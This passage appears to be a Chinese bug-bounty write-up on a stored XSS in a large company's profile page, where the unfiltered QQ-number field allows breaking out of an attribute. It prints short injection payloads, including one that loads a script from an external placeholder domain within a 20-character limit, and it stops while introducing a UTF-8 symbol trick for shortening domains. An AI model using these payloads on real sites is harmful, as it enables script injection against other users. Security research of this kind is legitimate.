# [](#header-1)前期资产搜集阶段

前期资产搜集阶段很艰难困苦，使用不少资产搜索框架，无法搜寻到大量有价值的资产信息  
(毕竟人家大厂的工程师也不是吃素的)  
  
在看了将近七八十个站点后，终于发现了可疑xss注入点  
# [](#header-1)前期注入阶段
在某子域下的某站点内的个人信息处，发现qq号信息竟然没有经过过滤  
于是仔细钻研qq号信息这个点，发现了以下规律  
1、qq号信息处可以填任意utf-8码字符，但是返回的网页会过滤<>  
2、qq号可作为公开信息展示在个人主页上，非常方便构造储存型xss  
3、qq号处处于某标签的value中  
4、qq号限制20长度字符，并且是后端校验  
  
手机号：经过了过滤  
QQ号：没有过滤  
邮箱：经过了过滤  
  
于是有机可乘的点就来了  
既然qq号处是处于某标签的value中，直接先""绕过，尝试构造新的标签参数  
```js
  " script="
```
成功，并且没有任何的过滤  
再试试能否执行script函数  
```js
  " script="alert(1)
```
成功  
但是依旧无法达到储存型xss要求，因为长度限制在20。我们想要执行更多脚本，必须引入外部url里面的脚本  
通过人脑极限压缩大法，我们最终将执行外部脚本极限压缩到15个字符  
```js
  " script=http//[填写域名]
```
但这样，我们填写的域名就不能超过五个字符了，非常的危险  
说实话，想了短域名等方法，都没想到解决方案，差点就放弃了  
  
但最后，还是想到了一个特别奇淫巧计的东西能利用：utf-8编码符号  
众所周知，utf-8字符集里有各种各样的符号，大家可能见过，但没用过，比如像：  
™	8482	2122
